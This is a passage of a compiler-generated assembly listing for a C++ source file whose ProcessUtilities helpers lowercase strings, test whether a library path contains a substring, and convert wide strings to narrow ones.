?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z PROC ; ProcessUtilities::_lower, COMDAT

; 9    : static std::string ProcessUtilities::_lower(std::string inp) {

	mov	QWORD PTR [rsp+24], rbx
	push	rbp
	push	rsi
	push	rdi
	sub	rsp, 64					; 00000040H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax
	mov	rsi, rdx
	mov	rbx, rcx
	mov	QWORD PTR __$ReturnUdt$GSCopy$[rsp], rcx
	mov	QWORD PTR inp$GSCopy$[rsp], rdx
	mov	DWORD PTR $T1[rsp], 0

; 10   : 	std::string out = "";

	lea	rdx, OFFSET FLAT:??_C@_00CNPNBAHC@@
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	DWORD PTR $T1[rsp], 1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rsi+24], 15

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN83@lower

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdi, QWORD PTR [rsi]
	mov	rcx, rdi
	mov	rdx, rdi
	jmp	SHORT $LN23@lower
$LN83@lower:
	mov	rdi, rsi
	mov	rcx, rsi
	mov	rdx, rsi
$LN23@lower:

; 3987 :         return _Mypair._Myval2._Myptr() + _Mypair._Myval2._Mysize;

	mov	rbp, QWORD PTR [rsi+16]
	add	rbp, rcx
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 11   : 	for ( auto& c : inp )

	cmp	rdx, rbp
	je	SHORT $LN3@lower
	npad	2
$LL4@lower:

; 12   : 		out += tolower(c);

	movsx	ecx, BYTE PTR [rdi]
	call	tolower
	mov	r9d, eax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4087 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

	mov	rcx, QWORD PTR [rbx+16]

; 4088 :         if (_Old_size < _Mypair._Myval2._Myres) {

	mov	rdx, QWORD PTR [rbx+24]
	cmp	rcx, rdx
	jae	SHORT $LN32@lower

; 4089 :             _ASAN_STRING_MODIFY(*this, _Old_size, _Old_size + 1);
; 4090 :             _Mypair._Myval2._Mysize = _Old_size + 1;

	lea	rax, QWORD PTR [rcx+1]
	mov	QWORD PTR [rbx+16], rax

; 2226 :         value_type* _Result = _Bx._Buf;

	mov	rax, rbx

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rdx, 15

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN35@lower

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rbx]
$LN35@lower:

; 4092 :             _Traits::assign(_Ptr[_Old_size], _Ch);

	mov	BYTE PTR [rax+rcx], r9b

; 4093 :             _Traits::assign(_Ptr[_Old_size + 1], _Elem());

	mov	BYTE PTR [rax+rcx+1], 0

; 4094 :             return;

	jmp	SHORT $LN2@lower
$LN32@lower:

; 4095 :         }
; 4096 : 
; 4097 :         _Reallocate_grow_by(

	mov	rcx, rbx
	call	??$_Reallocate_grow_by@V<lambda_1>@?1??push_back@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAXD@Z@D@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??push_back@01@QEAAXD@Z@D@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Reallocate_grow_by<`std::basic_string<char,std::char_traits<char>,std::allocator<char> >::push_back'::`2'::<lambda_1>,char>
$LN2@lower:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 11   : 	for ( auto& c : inp )

	inc	rdi
	cmp	rdi, rbp
	jne	SHORT $LL4@lower
$LN3@lower:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rsi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN58@lower

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rsi]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN72@lower

; 171  :     _Bytes += _Non_user_size;

	add	rdx, 39					; 00000027H

; 172  : 
; 173  :     const uintptr_t* const _Ptr_user = static_cast<uintptr_t*>(_Ptr);
; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN69@lower

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN72@lower:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN58@lower:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rsi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rsi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rsi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 13   : 	return out;

	mov	rax, rbx

; 14   : }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	mov	rbx, QWORD PTR [rsp+112]
	add	rsp, 64					; 00000040H
	pop	rdi
	pop	rsi
	pop	rbp
	ret	0
$LN69@lower:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN86@lower:
?_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z ENDP ; ProcessUtilities::_lower
_TEXT	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
__$ReturnUdt$GSCopy$ = 40
inp$GSCopy$ = 48
__$ArrayPad$ = 56
__$ReturnUdt$ = 96
inp$ = 104
?dtor$0@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA PROC ; `ProcessUtilities::_lower'::`1'::dtor$0
	mov	rcx, QWORD PTR inp$GSCopy$[rdx]
	jmp	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
?dtor$0@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA ENDP ; `ProcessUtilities::_lower'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
__$ReturnUdt$GSCopy$ = 40
inp$GSCopy$ = 48
__$ArrayPad$ = 56
__$ReturnUdt$ = 96
inp$ = 104
?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA PROC ; `ProcessUtilities::_lower'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	eax, DWORD PTR $T1[rbp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN8@dtor$1
	and	DWORD PTR $T1[rbp], -2
	mov	rcx, QWORD PTR __$ReturnUdt$GSCopy$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
$LN8@dtor$1:
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_lower@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@V23@@Z@4HA ENDP ; `ProcessUtilities::_lower'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z
_TEXT	SEGMENT
libPath$ = 96
s2$ = 104
?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z PROC ; ProcessUtilities::_sub, COMDAT

; 18   : static BOOL ProcessUtilities::_sub(std::string libPath, std::string s2) {

	push	rbp
	push	rsi
	push	rdi
	push	r13
	sub	rsp, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 18   : static BOOL ProcessUtilities::_sub(std::string libPath, std::string s2) {

	mov	rdi, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rbp, QWORD PTR [rdx+16]
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 18   : static BOOL ProcessUtilities::_sub(std::string libPath, std::string s2) {

	mov	rsi, rcx
	mov	QWORD PTR [rsp+112], rbx
	mov	QWORD PTR [rsp+40], r14
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r14, rdx
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 18   : static BOOL ProcessUtilities::_sub(std::string libPath, std::string s2) {

	mov	QWORD PTR [rsp+32], r15
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN120@sub

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r14, QWORD PTR [rdx]
$LN120@sub:

; 2244 :         return _Myres > _Small_string_capacity;

	mov	r13, QWORD PTR [rcx+24]

; 2235 :         const value_type* _Result = _Bx._Buf;

	mov	r15, rsi

; 4392 :         return static_cast<size_type>(_Traits_find<_Traits>(_Mypair._Myval2._Myptr(), _Mypair._Myval2._Mysize, _Off,

	mov	rax, QWORD PTR [rcx+16]

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN119@sub

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	r15, QWORD PTR [rcx]
$LN119@sub:
	mov	QWORD PTR [rsp+48], r12

; 575  :     if (_Needle_size > _Hay_size || _Start_at > _Hay_size - _Needle_size) {

	cmp	rbp, rax
	ja	SHORT $LN25@sub
	sub	rax, rbp

; 576  :         // xpos cannot exist, report failure
; 577  :         // N4950 [string.view.find]/3 says:
; 578  :         // 1. _Start_at <= xpos
; 579  :         // 2. xpos + _Needle_size <= _Hay_size;
; 580  :         // therefore:
; 581  :         // 3. _Needle_size <= _Hay_size (by 2) (checked above)
; 582  :         // 4. _Start_at + _Needle_size <= _Hay_size (substitute 1 into 2)
; 583  :         // 5. _Start_at <= _Hay_size - _Needle_size (4, move _Needle_size to other side) (also checked above)
; 584  :         return static_cast<size_t>(-1);
; 585  :     }
; 586  : 
; 587  :     if (_Needle_size == 0) { // empty string always matches if xpos is possible

	test	rbp, rbp
	jne	SHORT $LN26@sub

; 588  :         return _Start_at;

	xor	ebx, ebx
	jmp	SHORT $LN22@sub
$LN26@sub:

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	movsx	edx, BYTE PTR [r14]

; 591  :     const auto _Possible_matches_end = _Haystack + (_Hay_size - _Needle_size) + 1;

	lea	r12, QWORD PTR [rax+r15]

; 592  :     for (auto _Match_try = _Haystack + _Start_at;; ++_Match_try) {
; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	lea	r8, QWORD PTR [r12+1]

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	mov	rcx, r15

; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	sub	r8, r15

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	call	memchr
	mov	rbx, rax

; 594  :         if (!_Match_try) { // didn't find first character; report failure

	test	rax, rax
	je	SHORT $LN25@sub
	npad	6
$LL23@sub:

; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	mov	r8, rbp
	mov	rdx, r14
	mov	rcx, rbx
	call	memcmp

; 598  :         if (_Traits::compare(_Match_try, _Needle, _Needle_size) == 0) { // found match

	test	eax, eax
	je	$LN114@sub

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	movsx	edx, BYTE PTR [r14]

; 593  :         _Match_try = _Traits::find(_Match_try, static_cast<size_t>(_Possible_matches_end - _Match_try), *_Needle);

	lea	r8, QWORD PTR [r12+1]
	inc	rbx
	sub	r8, rbx

; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	mov	rcx, rbx
	call	memchr
	mov	rbx, rax

; 594  :         if (!_Match_try) { // didn't find first character; report failure

	test	rax, rax
	jne	SHORT $LL23@sub
$LN25@sub:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 19   : 	return libPath.find(s2) != std::string::npos;

	mov	rbx, -1
$LN22@sub:
	mov	r15, QWORD PTR [rsp+32]
	xor	ebp, ebp
	mov	r14, QWORD PTR [rsp+40]
	cmp	rbx, -1
	mov	r12, QWORD PTR [rsp+48]
	mov	rbx, QWORD PTR [rsp+112]
	setne	bpl
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	r13, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN54@sub
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rsi]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	lea	rdx, QWORD PTR [r13+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN68@sub

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN103@sub

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN68@sub:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN54@sub:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rsi+16], 0

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rsi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rsi], 0

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdi+24]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN92@sub
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rdi]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN106@sub

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN103@sub

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN106@sub:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN92@sub:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rdi+16], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 19   : 	return libPath.find(s2) != std::string::npos;

	mov	eax, ebp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rdi+24], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rdi], 0
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 20   : }

	add	rsp, 56					; 00000038H
	pop	r13
	pop	rdi
	pop	rsi
	pop	rbp
	ret	0
$LN114@sub:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 599  :             return static_cast<size_t>(_Match_try - _Haystack);

	sub	rbx, r15
	jmp	$LN22@sub
$LN103@sub:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN133@sub:
?_sub@ProcessUtilities@@YAHV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@0@Z ENDP ; ProcessUtilities::_sub
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp
;	COMDAT ?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z
_TEXT	SEGMENT
__$ReturnUdt$ = 64
inp$ = 72
$T1 = 80
$T2 = 80
?PWSTRToString@ProcessUtilities@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEA_W@Z PROC ; ProcessUtilities::PWSTRToString, COMDAT

; 22   : std::string ProcessUtilities::PWSTRToString(PWSTR inp) {

$LN59:
	mov	QWORD PTR [rsp+8], rbx
	mov	QWORD PTR [rsp+16], rbp
	mov	QWORD PTR [rsp+32], rsi
	push	rdi
	sub	rsp, 48					; 00000030H
	mov	rsi, rdx
	mov	rdi, rcx
	xor	ebp, ebp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 916  :     return ::operator new(sz);

	mov	ecx, 24
	call	??2@YAPEAX_K@Z				; operator new
	mov	rbx, rax
	mov	QWORD PTR $T1[rsp], rax

; 321  :     : m_Data(new Data_t(s))

	test	rax, rax
	je	SHORT $LN9@PWSTRToStr
	xorps	xmm0, xmm0
	xor	eax, eax
	movups	XMMWORD PTR [rbx], xmm0
	mov	QWORD PTR [rbx+16], rax

; 689  :     : m_str(NULL), m_RefCount(1)

	mov	QWORD PTR [rbx+8], rbp
	mov	DWORD PTR [rbx+16], 1

; 690  : {
; 691  :     m_wstr = ::SysAllocString(s);

	mov	rcx, rsi
	call	QWORD PTR __imp_SysAllocString
	mov	QWORD PTR [rbx], rax

; 692  : 
; 693  :     if (m_wstr == NULL && s != NULL) {

	test	rax, rax
	jne	SHORT $LN10@PWSTRToStr
	test	rsi, rsi
	jne	$LN56@PWSTRToStr
	jmp	SHORT $LN10@PWSTRToStr
$LN9@PWSTRToStr:

; 321  :     : m_Data(new Data_t(s))

	mov	rbx, rbp
$LN10@PWSTRToStr:
	mov	QWORD PTR $T2[rsp], rbx
	test	rbx, rbx

; 322  : {
; 323  :     if (m_Data == NULL) {

	je	SHORT $LN57@PWSTRToStr

; 825  :     if (m_str == NULL) {

	mov	rax, QWORD PTR [rbx+8]
	test	rax, rax
	jne	SHORT $LN27@PWSTRToStr

; 826  :         m_str = _com_util::ConvertBSTRToString(m_wstr);

	mov	rcx, QWORD PTR [rbx]
	call	?ConvertBSTRToString@_com_util@@YAPEADPEA_W@Z ; _com_util::ConvertBSTRToString
	mov	QWORD PTR [rbx+8], rax
$LN27@PWSTRToStr:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

; 23   : 	return std::string(_bstr_t(inp));

	mov	rdx, rax
	mov	rcx, rdi
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@QEBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\comutil.h

; 773  :     unsigned long cRef = static_cast<unsigned long>(

	mov	eax, -1
	lock xadd DWORD PTR [rbx+16], eax
	cmp	eax, 1

; 774  :         InterlockedDecrement(reinterpret_cast<long*>(&m_RefCount)));
; 775  :     if (cRef == 0) {

	jne	SHORT $LN43@PWSTRToStr

; 931  :     if (m_wstr != NULL) {

	mov	rcx, QWORD PTR [rbx]
	test	rcx, rcx
	je	SHORT $LN50@PWSTRToStr

; 932  :         ::SysFreeString(m_wstr);

	call	QWORD PTR __imp_SysFreeString

; 933  :         m_wstr = NULL;

	mov	QWORD PTR [rbx], rbp
$LN50@PWSTRToStr:

; 934  :     }
; 935  : 
; 936  :     if (m_str != NULL) {

	mov	rcx, QWORD PTR [rbx+8]
	test	rcx, rcx
	je	SHORT $LN51@PWSTRToStr

; 937  :         delete [] m_str;

	call	??_V@YAXPEAX@Z				; operator delete[]

; 938  :         m_str = NULL;

	mov	QWORD PTR [rbx+8], rbp
$LN51@PWSTRToStr:
	mov	edx, 24
	mov	rcx, rbx
	call	??3@YAXPEAX_K@Z				; operator delete
$LN43@PWSTRToStr:
; File C:\Users\ethan\source\repos\DLL\DLL\Source\procutils.cpp

